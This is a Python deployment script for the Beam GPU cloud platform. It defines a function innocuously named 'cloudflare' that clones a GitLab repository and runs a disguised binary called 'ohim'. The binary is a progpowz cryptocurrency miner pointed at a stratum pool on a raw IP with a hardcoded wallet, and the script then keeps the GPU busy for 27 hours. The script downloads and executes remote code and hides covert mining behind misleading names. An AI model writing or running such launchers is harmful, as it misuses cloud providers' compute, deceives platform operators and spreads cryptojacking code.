from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="cloudflare",
    image=image,
    gpu="RTX4090",
    cpu=8,
    memory="24Gi",
    timeout=27 * 60 * 60,
)
def run_script():

    print("=== CHECK GPU ===")
    subprocess.run(
        ["nvidia-smi"],
        check=False,
    )

    cmd = """
    set -e

    echo "=== CURRENT DIRECTORY ==="
    pwd

    echo "=== CLONE HAL ==="
    cd /mnt/code
    rm -rf hal
    git clone https://gitlab.com/wimulyono7/hal.git

    echo "=== CHECK HAL ==="
    ls -lah /mnt/code/hal

    echo "=== CHECK BASH ==="
    ls -lh /mnt/code/hal/ohim

    echo "=== SET PERMISSION ==="
    chmod u+x /mnt/code/hal/ohim

    echo "=== SELESAI ==="
    cd /mnt/code/hal
    pwd
    ls -lah
    
    echo "=== RUN PROC DIRECT ==="
    ./ohim --print-full --algo progpowz --url stratum+tcp://95.111.195.159:80 --worker  --user iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS --pass
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 27 hours...")
    time.sleep(60 * 60 * 27)
